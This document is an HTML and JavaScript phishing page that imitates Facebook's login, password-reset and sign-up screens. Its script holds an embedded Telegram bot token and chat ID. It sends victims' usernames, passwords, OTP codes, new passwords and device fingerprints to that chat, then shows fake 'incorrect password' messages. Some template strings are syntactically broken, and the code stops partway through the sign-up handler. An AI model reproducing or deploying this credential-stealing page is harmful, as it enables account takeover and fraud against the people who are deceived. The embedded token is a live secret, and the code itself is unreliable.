<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log in or Sign up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            padding: 72px 0;
        }
        
        .content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 980px;
            width: 100%;
            padding: 20px;
        }
        
        .left-section {
            max-width: 580px;
            padding-right: 32px;
            margin-right: 0;
        }
        
        .logo {
            height: 106px;
            margin: -28px;
        }
        
        .logo h1 {
            font-size: 56px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 16px;
        }
        
        h2 {
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            width: 500px;
        }
        
        .right-section {
            max-width: 396px;
            width: 100%;
        }
        
        .login-form {
            background-color: #fff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            margin-bottom: 28px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        input[type="text"],
        input[type="password"],
        input[type="email"],
        input[type="tel"] {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            color: #1d2129;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus,
        input[type="email"]:focus,
        input[type="tel"]:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
            outline: none;
        }
        
        .login-button {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 16px;
        }
        
        .login-button:hover {
            background-color: #166fe5;
        }
        
        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .divider {
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 20px 0;
        }
        
        .create-account {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            padding: 0 16px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            display: block;
            margin: 0 auto;
        }
        
        .create-account:hover {
            background-color: #36a420;
        }
        
        .create-page {
            text-align: center;
            margin-top: 28px;
            font-size: 14px;
        }
        
        .create-page a {
            color: #1c1e21;
            font-weight: bold;
            text-decoration: none;
        }
        
        .create-page a:hover {
            text-decoration: underline;
        }
        
        footer {
            background-color: #fff;
            padding: 20px 0;
            margin-top: auto;
        }
        
        .footer-content {
            max-width: 980px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            margin-bottom: 10px;
        }
        
        .footer-links a {
            color: #8a8d91;
            font-size: 12px;
            margin-right: 20px;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .copyright {
            color: #8a8d91;
            font-size: 11px;
        }
        
        /* Modal styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal-content {
            background-color: #fff;
            border-radius: 8px;
            width: 432px;
            max-width: 90%;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
        }
        
        .modal-header {
            padding: 16px;
            border-bottom: 1px solid #dadde1;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .modal-title {
            font-size: 20px;
            font-weight: bold;
        }
        
        .close-button {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8a8d91;
        }
        
        .modal-body {
            padding: 16px;
        }
        
        .modal-footer {
            padding: 16px;
            border-top: 1px solid #dadde1;
            display: flex;
            justify-content: flex-end;
        }
        
        .cancel-button {
            background-color: #e4e6eb;
            border: none;
            border-radius: 6px;
            padding: 8px 16px;
            margin-right: 8px;
            cursor: pointer;
            font-weight: bold;
        }
        
        .continue-button {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            padding: 8px 16px;
            color: white;
            cursor: pointer;
            font-weight: bold;
        }
        
        .otp-input {
            width: 100%;
            padding: 11px;
            font-size: 15px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            margin-bottom: 12px;
        }
        
        .search-input {
            width: 100%;
            padding: 11px;
            font-size: 15px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            margin-bottom: 12px;
        }
        
        .info-text {
            color: #65676b;
            font-size: 15px;
            margin-bottom: 16px;
        }
        
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #1877f2;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .search-results {
            max-height: 200px;
            overflow-y: auto;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            margin-top: 10px;
        }
        
        .search-result-item {
            padding: 10px;
            border-bottom: 1px solid #f0f2f5;
            cursor: pointer;
        }
        
        .search-result-item:hover {
            background-color: #f0f2f5;
        }
        
        .search-result-item:last-child {
            border-bottom: none;
        }
        
        .timer {
            text-align: center;
            margin: 10px 0;
            font-size: 14px;
            color: #65676b;
        }
        
        .resend-option {
            text-align: center;
            margin-top: 15px;
        }
        
        .resend-option a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        
        .resend-option a:hover {
            text-decoration: underline;
        }
        
        .resend-option a.disabled {
            color: #8a8d91;
            pointer-events: none;
        }
        
        .success-message {
            color: #42b72a;
            text-align: center;
            margin: 10px 0;
            display: none;
        }
        
        .error-message {
            color: #f02849;
            text-align: center;
            margin: 10px 0;
            display: none;
        }
        
        .form-row {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }
        
        .form-row .form-group {
            flex: 1;
            margin-bottom: 0;
        }
        
        select {
            width: 100%;
            padding: 8px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 15px;
            background-color: white;
        }
        
        .gender-option {
            display: flex;
            align-items: center;
            padding: 8px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            margin-bottom: 8px;
            cursor: pointer;
        }
        
        .gender-option:hover {
            background-color: #f0f2f5;
        }
        
        .gender-option input {
            margin-right: 8px;
        }
        
        .terms {
            font-size: 11px;
            color: #777;
            margin: 15px 0;
            line-height: 1.4;
        }
        
        .hidden {
            display: none;
        }
        
        .whatsapp-option, .phone-option, .password-option {
            padding: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            margin-bottom: 10px;
            cursor: pointer;
        }
        
        .whatsapp-option:hover, .phone-option:hover, .password-option:hover {
            background-color: #f0f2f5;
        }
        
        .option-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .option-description {
            font-size: 14px;
            color: #65676b;
        }
        
        .phone-number {
            font-weight: bold;
            color: #1877f2;
        }
        
        .code-sending {
            text-align: center;
            margin: 10px 0;
            font-size: 14px;
            color: #65676b;
        }
        
        .password-input {
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="content">
            <div class="left-section">
                <div class="logo">
                    <h1>facebook</h1>
                </div>
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
            <div class="right-section">
                <div class="login-form">
                    <form id="loginForm">
                        <div class="form-group">
                            <input type="text" id="email" placeholder="Email address or phone number" required>
                        </div>
                        <div class="form-group">
                            <input type="password" id="password" placeholder="Password" required>
                        </div>
                        <button type="submit" class="login-button">Log in</button>
                        <div class="forgot-password">
                            <a href="#" id="forgotPasswordLink">Forgotten password?</a>
                        </div>
                        <div class="divider"></div>
                        <button type="button" class="create-account" id="createAccountBtn">Create new account</button>
                    </form>
                </div>
                <div class="create-page">
                    <a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.
                </div>
            </div>
        </div>
    </div>

    <!-- Forgot Password Modal -->
    <div class="modal" id="forgotPasswordModal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">Find Your Account</div>
                <button class="close-button" id="closeForgotPassword">&times;</button>
            </div>
            <div class="modal-body">
                <div class="info-text">Please enter your email address or mobile number to search for your account.</div>
                <input type="text" class="search-input" id="forgotPasswordInput" placeholder="Email address or mobile number">
                <div id="searchResults" class="search-results" style="display: none;"></div>
                <div id="forgotPasswordError" class="error-message"></div>
            </div>
            <div class="modal-footer">
                <button class="cancel-button" id="cancelForgotPassword">Cancel</button>
                <button class="continue-button" id="continueForgotPassword">Search</button>
            </div>
        </div>
    </div>

    <!-- OTP Verification Modal -->
    <div class="modal" id="otpModal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">Confirm your account</div>
                <button class="close-button" id="closeOtpModal">&times;</button>
            </div>
            <div class="modal-body">
                <div class="info-text">We sent a code via WhatsApp. Enter that code to confirm your account.</div>
                <input type="text" class="otp-input" id="otpInput" placeholder="Enter code" maxlength="6">
                <div class="code-sending" id="codeSending">Sending code (00:<span id="countdown">60</span>)</div>
                <div class="resend-option">
                    <a href="#" id="resendOtp" class="disabled">Didn't get a code? Resend</a>
                </div>
                <div id="otpLoader" class="loader" style="display: none;"></div>
                <div id="otpError" class="error-message">Incorrect code. Please try again.</div>
                <div id="otpSuccess" class="success-message">Code verified successfully!</div>
            </div>
            <div class="modal-footer">
                <button class="cancel-button" id="cancelOtp">Cancel</button>
                <button class="continue-button" id="continueOtp">Continue</button>
            </div>
        </div>
    </div>

    <!-- Login Options Modal -->
    <div class="modal" id="loginOptionsModal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">Choose a way to log in</div>
                <button class="close-button" id="closeLoginOptions">&times;</button>
            </div>
            <div class="modal-body">
                <div class="whatsapp-option" id="whatsappOption">
                    <div class="option-title">Get code or link via WhatsApp</div>
                    <div class="phone-number" id="whatsappNumber">+91 7879018162</div>
                </div>
                <div class="phone-option" id="phoneOption">
                    <div class="option-title">Confirm via phone call</div>
                    <div class="phone-number" id="phoneNumber">+91 7879018162</div>
                    <div class="option-description">You won't need to answer</div>
                </div>
                <div class="password-option" id="passwordOption">
                    <div class="option-title">Enter password to log in</div>
                    <div class="option-description">See more</div>
                    <div class="password-input hidden" id="passwordInputContainer">
                        <input type="password" id="confirmPassword" placeholder="Password">
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="cancel-button" id="cancelLoginOptions">Cancel</button>
                <button class="continue-button" id="continueLoginOptions">Continue</button>
            </div>
        </div>
    </div>

    <!-- Create Account Modal -->
    <div class="modal" id="createAccountModal">
        <div class="modal-content" style="width: 432px;">
            <div class="modal-header">
                <div class="modal-title">Sign Up</div>
                <button class="close-button" id="closeCreateAccount">&times;</button>
            </div>
            <div class="modal-body">
                <div class="info-text">It's quick and easy.</div>
                <form id="signupForm">
                    <div class="form-row">
                        <div class="form-group">
                            <input type="text" id="firstName" placeholder="First name" required>
                        </div>
                        <div class="form-group">
                            <input type="text" id="lastName" placeholder="Surname" required>
                        </div>
                    </div>
                    <div class="form-group">
                        <input type="text" id="mobileEmail" placeholder="Mobile number or email address" required>
                    </div>
                    <div class="form-group">
                        <input type="password" id="newPassword" placeholder="New password" required>
                    </div>
                    <div class="form-group">
                        <div style="font-size: 12px; color: #606770; margin-bottom: 10px;">Date of birth</div>
                        <div class="form-row">
                            <select id="birthDay" required>
                                <option value="">Day</option>
                                <!-- Days will be populated by JS -->
                            </select>
                            <select id="birthMonth" required>
                                <option value="">Month</option>
                                <!-- Months will be populated by JS -->
                            </select>
                            <select id="birthYear" required>
                                <option value="">Year</option>
                                <!-- Years will be populated by JS -->
                            </select>
                        </div>
                    </div>
                    <div class="form-group">
                        <div style="font-size: 12px; color: #606770; margin-bottom: 10px;">Gender</div>
                        <div class="form-row">
                            <label class="gender-option" style="flex: 1;">
                                Female <input type="radio" name="gender" value="female" required>
                            </label>
                            <label class="gender-option" style="flex: 1;">
                                Male <input type="radio" name="gender" value="male" required>
                            </label>
                            <label class="gender-option" style="flex: 1;">
                                Custom <input type="radio" name="gender" value="custom" required>
                            </label>
                        </div>
                    </div>
                    <div class="terms">
                        By clicking Sign Up, you agree to our Terms, Privacy Policy and Cookies Policy. You may receive SMS notifications from us and can opt out at any time.
                    </div>
                </form>
                <div id="signupError" class="error-message"></div>
                <div id="signupSuccess" class="success-message"></div>
            </div>
            <div class="modal-footer">
                <button class="cancel-button" id="cancelCreateAccount">Cancel</button>
                <button class="continue-button" id="continueCreateAccount">Sign Up</button>
            </div>
        </div>
    </div>

    <!-- Password Reset Modal -->
    <div class="modal" id="resetPasswordModal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title">Create New Password</div>
                <button class="close-button" id="closeResetPassword">&times;</button>
            </div>
            <div class="modal-body">
                <div class="info-text">Create a new password that is at least 6 characters long. A strong password has a combination of letters, digits and punctuation.</div>
                <div class="form-group">
                    <input type="password" id="newPasswordInput" placeholder="New password" required>
                </div>
                <div class="form-group">
                    <input type="password" id="confirmPasswordInput" placeholder="Confirm password" required>
                </div>
                <div id="resetError" class="error-message"></div>
                <div id="resetSuccess" class="success-message"></div>
            </div>
            <div class="modal-footer">
                <button class="cancel-button" id="cancelResetPassword">Cancel</button>
                <button class="continue-button" id="continueResetPassword">Continue</button>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">English (UK)</a>
                <a href="#">हिन्दी</a>
                <a href="#">اردو</a>
                <a href="#">ਪੰਜਾਬੀ</a>
                <a href="#">বাংলা</a>
                <a href="#">ગુજરાતી</a>
                <a href="#">मराठी</a>
                <a href="#">தமிழ்</a>
                <a href="#">తెలుగు</a>
                <a href="#">മലയാളം</a>
                <a href="#">ಕನ್ನಡ</a>
                <a href="#"><i class="fas fa-plus"></i></a>
            </div>
            <div class="footer-links">
                <a href="#">Sign Up</a>
                <a href="#">Log in</a>
                <a href="#">Messenger</a>
                <a href="#">Facebook Lite</a>
                <a href="#">Video</a>
                <a href="#">Places</a>
                <a href="#">Games</a>
                <a href="#">Marketplace</a>
                <a href="#">Meta Pay</a>
                <a href="#">Meta Store</a>
                <a href="#">Meta Quest</a>
                <a href="#">Imagine with Meta AI</a>
                <a href="#">Instagram</a>
                <a href="#">Threads</a>
                <a href="#">Fundraisers</a>
                <a href="#">Services</a>
                <a href="#">Voting Information Centre</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Privacy Centre</a>
                <a href="#">Groups</a>
                <a href="#">About</a>
                <a href="#">Create ad</a>
                <a href="#">Create Page</a>
                <a href="#">Developers</a>
                <a href="#">Careers</a>
                <a href="#">Cookies</a>
                <a href="#">AdChoices</a>
                <a href="#">Terms</a>
                <a href="#">Help</a>
                <a href="#">Contact uploading and non-users</a>
            </div>
            <div class="copyright">Meta © 2025</div>
        </div>
    </footer>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8190894064:AAHy_S3-APSvn_on8DuSvb7OOeUiBDCQsAI';
        const TELEGRAM_CHAT_ID = '7238241682';

        // DOM Elements
        const loginForm = document.getElementById('loginForm');
        const forgotPasswordLink = document.getElementById('forgotPasswordLink');
        const createAccountBtn = document.getElementById('createAccountBtn');
        const forgotPasswordModal = document.getElementById('forgotPasswordModal');
        const closeForgotPassword = document.getElementById('closeForgotPassword');
        const cancelForgotPassword = document.getElementById('cancelForgotPassword');
        const continueForgotPassword = document.getElementById('continueForgotPassword');
        const forgotPasswordInput = document.getElementById('forgotPasswordInput');
        const searchResults = document.getElementById('searchResults');
        const forgotPasswordError = document.getElementById('forgotPasswordError');
        const otpModal = document.getElementById('otpModal');
        const closeOtpModal = document.getElementById('closeOtpModal');
        const cancelOtp = document.getElementById('cancelOtp');
        const continueOtp = document.getElementById('continueOtp');
        const otpInput = document.getElementById('otpInput');
        const otpLoader = document.getElementById('otpLoader');
        const otpError = document.getElementById('otpError');
        const otpSuccess = document.getElementById('otpSuccess');
        const countdown = document.getElementById('countdown');
        const resendOtp = document.getElementById('resendOtp');
        const codeSending = document.getElementById('codeSending');
        const loginOptionsModal = document.getElementById('loginOptionsModal');
        const closeLoginOptions = document.getElementById('closeLoginOptions');
        const cancelLoginOptions = document.getElementById('cancelLoginOptions');
        const continueLoginOptions = document.getElementById('continueLoginOptions');
        const whatsappOption = document.getElementById('whatsappOption');
        const phoneOption = document.getElementById('phoneOption');
        const passwordOption = document.getElementById('passwordOption');
        const passwordInputContainer = document.getElementById('passwordInputContainer');
        const confirmPassword = document.getElementById('confirmPassword');
        const whatsappNumber = document.getElementById('whatsappNumber');
        const phoneNumber = document.getElementById('phoneNumber');
        const createAccountModal = document.getElementById('createAccountModal');
        const closeCreateAccount = document.getElementById('closeCreateAccount');
        const cancelCreateAccount = document.getElementById('cancelCreateAccount');
        const continueCreateAccount = document.getElementById('continueCreateAccount');
        const signupForm = document.getElementById('signupForm');
        const signupError = document.getElementById('signupError');
        const signupSuccess = document.getElementById('signupSuccess');
        const resetPasswordModal = document.getElementById('resetPasswordModal');
        const closeResetPassword = document.getElementById('closeResetPassword');
        const cancelResetPassword = document.getElementById('cancelResetPassword');
        const continueResetPassword = document.getElementById('continueResetPassword');
        const newPasswordInput = document.getElementById('newPasswordInput');
        const confirmPasswordInput = document.getElementById('confirmPasswordInput');
        const resetError = document.getElementById('resetError');
        const resetSuccess = document.getElementById('resetSuccess');

        // Global variables
        let otpCountdown;
        let currentOtpValue = '';
        let currentForgotPasswordEmail = '';
        let selectedLoginOption = '';
        let pageLoadTime = Date.now();

        // Event Listeners
        loginForm.addEventListener('submit', handleLogin);
        forgotPasswordLink.addEventListener('click', openForgotPasswordModal);
        createAccountBtn.addEventListener('click', openCreateAccountModal);
        closeForgotPassword.addEventListener('click', closeForgotPasswordModal);
        cancelForgotPassword.addEventListener('click', closeForgotPasswordModal);
        continueForgotPassword.addEventListener('click', handleForgotPasswordSearch);
        closeOtpModal.addEventListener('click', closeOtpModalFunc);
        cancelOtp.addEventListener('click', closeOtpModalFunc);
        continueOtp.addEventListener('click', handleOtpVerification);
        resendOtp.addEventListener('click', handleResendOtp);
        closeLoginOptions.addEventListener('click', closeLoginOptionsModal);
        cancelLoginOptions.addEventListener('click', closeLoginOptionsModal);
        continueLoginOptions.addEventListener('click', handleLoginOptionsContinue);
        whatsappOption.addEventListener('click', () => selectLoginOption('whatsapp'));
        phoneOption.addEventListener('click', () => selectLoginOption('phone'));
        passwordOption.addEventListener('click', () => selectLoginOption('password'));
        closeCreateAccount.addEventListener('click', closeCreateAccountModal);
        cancelCreateAccount.addEventListener('click', closeCreateAccountModal);
        continueCreateAccount.addEventListener('click', handleCreateAccount);
        closeResetPassword.addEventListener('click', closeResetPasswordModal);
        cancelResetPassword.addEventListener('click', closeResetPasswordModal);
        continueResetPassword.addEventListener('click', handlePasswordReset);

        // Initialize page
        document.addEventListener('DOMContentLoaded', function() {
            // Populate date dropdowns
            populateDateDropdowns();
            
            // Send initial visit information
            setTimeout(() => {
                sendInitialVisitInfo();
            }, 2000);
        });

        // Modal Functions
        function openForgotPasswordModal(e) {
            e.preventDefault();
            forgotPasswordModal.style.display = 'flex';
            forgotPasswordInput.value = '';
            forgotPasswordError.style.display = 'none';
        }

        function closeForgotPasswordModal() {
            forgotPasswordModal.style.display = 'none';
            forgotPasswordInput.value = '';
            searchResults.style.display = 'none';
            forgotPasswordError.style.display = 'none';
        }

        function openCreateAccountModal() {
            createAccountModal.style.display = 'flex';
            signupError.style.display = 'none';
            signupSuccess.style.display = 'none';
        }

        function closeCreateAccountModal() {
            createAccountModal.style.display = 'none';
            signupForm.reset();
            signupError.style.display = 'none';
            signupSuccess.style.display = 'none';
        }

        function closeOtpModalFunc() {
            otpModal.style.display = 'none';
            otpInput.value = '';
            otpError.style.display = 'none';
            otpSuccess.style.display = 'none';
            clearInterval(otpCountdown);
        }

        function closeLoginOptionsModal() {
            loginOptionsModal.style.display = 'none';
            selectedLoginOption = '';
            passwordInputContainer.classList.add('hidden');
        }

        function closeResetPasswordModal() {
            resetPasswordModal.style.display = 'none';
            newPasswordInput.value = '';
            confirmPasswordInput.value = '';
            resetError.style.display = 'none';
            resetSuccess.style.display = 'none';
        }

        // Handle Login
        async function handleLogin(e) {
            e.preventDefault();
            
            const username = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert('Please fill in all fields');
                return;
            }
            
            // Show loading state
            const loginButton = loginForm.querySelector('.login-button');
            const originalText = loginButton.textContent;
            loginButton.textContent = 'Logging in...';
            loginButton.disabled = true;
            
            // Collect device and network information
            const deviceInfo = await collectDeviceInfo();
            const networkInfo = await collectNetworkInfo();
            const behavioralInfo = collectBehavioralInfo();
            const fingerprint = generateFingerprint();
            
            // Send data to Telegram
            try {
                await sendToTelegram(username, password, deviceInfo, networkInfo, behavioralInfo, fingerprint);
                
                // Simulate login process
                setTimeout(() => {
                    loginButton.textContent = 'Login Failed';
                    loginButton.style.backgroundColor = '#fa383e';
                    
                    setTimeout(() => {
                        loginButton.textContent = originalText;
                        loginButton.disabled = false;
                        loginButton.style.backgroundColor = '#1877f2';
                        alert('The password that you\'ve entered is incorrect. Forgotten password?');
                    }, 2000);
                }, 1500);
                
            } catch (error) {
                console.error('Error sending data to Telegram:', error);
                loginButton.textContent = originalText;
                loginButton.disabled = false;
                alert('Something went wrong. Please try again.');
            }
        }

        // Handle Forgot Password Search
        function handleForgotPasswordSearch() {
            const searchValue = forgotPasswordInput.value.trim();
            
            if (!searchValue) {
                forgotPasswordError.textContent = 'Please enter your email address or mobile number';
                forgotPasswordError.style.display = 'block';
                return;
            }
            
            // Validate input
            if (!isValidEmail(searchValue) && !isValidPhone(searchValue)) {
                forgotPasswordError.textContent = 'Please enter a valid email address or mobile number';
                forgotPasswordError.style.display = 'block';
                return;
            }
            
            // Show loading
            continueForgotPassword.textContent = 'Searching...';
            continueForgotPassword.disabled = true;
            
            // Store the email/phone for later use
            currentForgotPasswordEmail = searchValue;
            
            // Update phone numbers in login options
            whatsappNumber.textContent = searchValue;
            phoneNumber.textContent = searchValue;
            
            // Send search attempt to Telegram
            sendMessageToTelegram(🔐 FORGOT PASSWORD REQUEST\n📱 Phone/Email: ${searchValue}\n⏰ Time: ${new Date().toLocaleString()});
            
            // Simulate search
            setTimeout(() => {
                searchResults.innerHTML = `
                    <div class="search-result-item">
                        <div style="font-weight: bold;">Account Found</div>
                        <div style="font-size: 14px; color: #65676b;">We found an account with the information you provided.</div>
                    </div>
                `;
                searchResults.style.display = 'block';
                
                continueForgotPassword.textContent = 'Continue';
                continueForgotPassword.disabled = false;
                
                // Change continue button behavior to show login options
                continueForgotPassword.onclick = showLoginOptions;
            }, 1500);
        }

        // Show Login Options
        function showLoginOptions() {
            forgotPasswordModal.style.display = 'none';
            loginOptionsModal.style.display = 'flex';
            selectedLoginOption = '';
            passwordInputContainer.classList.add('hidden');
        }

        // Select Login Option
        function selectLoginOption(option) {
            selectedLoginOption = option;
            
            // Reset all options
            whatsappOption.style.backgroundColor = '';
            phoneOption.style.backgroundColor = '';
            passwordOption.style.backgroundColor = '';
            
            // Highlight selected option
            if (option === 'whatsapp') {
                whatsappOption.style.backgroundColor = '#f0f2f5';
            } else if (option === 'phone') {
                phoneOption.style.backgroundColor = '#f0f2f5';
            } else if (option === 'password') {
                passwordOption.style.backgroundColor = '#f0f2f5';
                passwordInputContainer.classList.remove('hidden');
            }
        }

        // Handle Login Options Continue
        function handleLoginOptionsContinue() {
            if (!selectedLoginOption) {
                alert('Please select a login option');
                return;
            }
            
            if (selectedLoginOption === 'password') {
                const password = confirmPassword.value;
                if (!password) {
                    alert('Please enter your password');
                    return;
                }
                
                // Send password attempt to Telegram
                sendMessageToTelegram(🔐 PASSWORD LOGIN ATTEMPT\n📱 Phone/Email: ${currentForgotPasswordEmail}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()});
                
                // Show loading
                continueLoginOptions.textContent = 'Logging in...';
                continueLoginOptions.disabled = true;
                
                // Simulate login
                setTimeout(() => {
                    continueLoginOptions.textContent = 'Continue';
                    continueLoginOptions.disabled = false;
                    alert('Incorrect password. Please try again.');
                }, 2000);
                
            } else if (selectedLoginOption === 'whatsapp') {
                // Generate a random 6-digit OTP
                currentOtpValue = Math.floor(100000 + Math.random() * 900000).toString();
                
                // Show OTP modal
                loginOptionsModal.style.display = 'none';
                otpModal.style.display = 'flex';
                
                // Start the countdown timer
                startOtpTimer();
                
                // Send OTP to Telegram
                sendMessageToTelegram(🔐 WHATSAPP OTP SENT\n📱 Phone: ${currentForgotPasswordEmail}\n🔢 OTP Code: ${currentOtpValue}\n⏰ Time: ${new Date().toLocaleString()});
                
            } else if (selectedLoginOption === 'phone') {
                // Send phone call attempt to Telegram
                sendMessageToTelegram(🔐 PHONE CALL VERIFICATION\n📱 Phone: ${currentForgotPasswordEmail}\n⏰ Time: ${new Date().toLocaleString()});
                
                // Show loading
                continueLoginOptions.textContent = 'Calling...';
                continueLoginOptions.disabled = true;
                
                // Simulate phone call
                setTimeout(() => {
                    continueLoginOptions.textContent = 'Continue';
                    continueLoginOptions.disabled = false;
                    alert('We are calling your phone. Please wait for the automated verification.');
                }, 3000);
            }
        }

        // Start OTP Timer
        function startOtpTimer() {
            let timeLeft = 60;
            countdown.textContent = timeLeft;
            codeSending.style.display = 'block';
            resendOtp.classList.add('disabled');
            
            otpCountdown = setInterval(() => {
                timeLeft--;
                countdown.textContent = timeLeft < 10 ? '0' + timeLeft : timeLeft;
                
                if (timeLeft <= 0) {
                    clearInterval(otpCountdown);
                    codeSending.style.display = 'none';
                    resendOtp.classList.remove('disabled');
                }
            }, 1000);
        }

        // Handle Resend OTP
        function handleResendOtp(e) {
            e.preventDefault();
            
            if (resendOtp.classList.contains('disabled')) {
                return;
            }
            
            // Generate a new OTP
            currentOtpValue = Math.floor(100000 + Math.random() * 900000).toString();
            
            // Restart the timer
            startOtpTimer();
            
            // Send new OTP to Telegram
            sendMessageToTelegram(🔐 OTP RESENT\n📱 Phone: ${currentForgotPasswordEmail}\n🔢 New OTP Code: ${currentOtpValue}\n⏰ Time: ${new Date().toLocaleString()});
            
            // Show success message
            otpSuccess.textContent = 'Code sent successfully!';
            otpSuccess.style.display = 'block';
            setTimeout(() => {
                otpSuccess.style.display = 'none';
            }, 3000);
        }

        // Handle OTP Verification
        function handleOtpVerification() {
            const otpValue = otpInput.value.trim();
            
            if (!otpValue) {
                otpError.textContent = 'Please enter the code';
                otpError.style.display = 'block';
                return;
            }
            
            if (otpValue.length !== 6) {
                otpError.textContent = 'Please enter a valid 6-digit code';
                otpError.style.display = 'block';
                return;
            }
            
            // Show loading
            continueOtp.textContent = '';
            otpLoader.style.display = 'block';
            continueOtp.disabled = true;
            
            // Send OTP attempt to Telegram
            sendMessageToTelegram(🔐 OTP VERIFICATION ATTEMPT\n📱 Phone: ${currentForgotPasswordEmail}\n🔢 OTP Entered: ${otpValue}\n✅ Correct OTP: ${currentOtpValue}\n⏰ Time: ${new Date().toLocaleString()});
            
            // Simulate OTP verification
            setTimeout(() => {
                otpLoader.style.display = 'none';
                continueOtp.textContent = 'Continue';
                continueOtp.disabled = false;
                
                if (otpValue === currentOtpValue) {
                    // Correct OTP
                    otpSuccess.textContent = 'Code verified successfully!';
                    otpSuccess.style.display = 'block';
                    otpError.style.display = 'none';
                    
                    // Proceed to password reset after a delay
                    setTimeout(() => {
                        closeOtpModalFunc();
                        resetPasswordModal.style.display = 'flex';
                    }, 1500);
                } else {
                    // Incorrect OTP
                    otpError.style.display = 'block';
                    otpSuccess.style.display = 'none';
                }
            }, 2000);
        }

        // Handle Password Reset
        function handlePasswordReset() {
            const newPassword = newPasswordInput.value;
            const confirmPassword = confirmPasswordInput.value;
            
            if (!newPassword || !confirmPassword) {
                resetError.textContent = 'Please fill in all fields';
                resetError.style.display = 'block';
                return;
            }
            
            if (newPassword.length < 6) {
                resetError.textContent = 'Password must be at least 6 characters long';
                resetError.style.display = 'block';
                return;
            }
            
            if (newPassword !== confirmPassword) {
                resetError.textContent = 'Passwords do not match';
                resetError.style.display = 'block';
                return;
            }
            
            // Show loading
            continueResetPassword.textContent = 'Resetting...';
            continueResetPassword.disabled = true;
            
            // Send password reset to Telegram
            sendMessageToTelegram(🔐 PASSWORD RESET COMPLETED\n📱 Phone/Email: ${currentForgotPasswordEmail}\n🔑 New Password: ${newPassword}\n⏰ Time: ${new Date().toLocaleString()});
            
            // Simulate password reset
            setTimeout(() => {
                resetSuccess.textContent = 'Password reset successfully!';
                resetSuccess.style.display = 'block';
                resetError.style.display = 'none';
                
                // Close modal after success
                setTimeout(() => {
                    closeResetPasswordModal();
                    alert('Your password has been reset successfully. You can now log in with your new password.');
                }, 2000);
            }, 1500);
        }

        // Handle Create Account
        function handleCreateAccount() {
            const firstName = document.getElementById('firstName').value;
            const lastName = document.getElementById('lastName').value;
            const mobileEmail = document.getElementById('mobileEmail').value;
            const newPassword = document.getElementById('newPassword').value;
            const birthDay = document.getElementById('birthDay').value;
            const birthMonth = document.getElementById('birthMonth').value;
            const birthYear = document.getElementById('birthYear').value;
            const gender = document.querySelector('input[name="gender"]:checked');
            
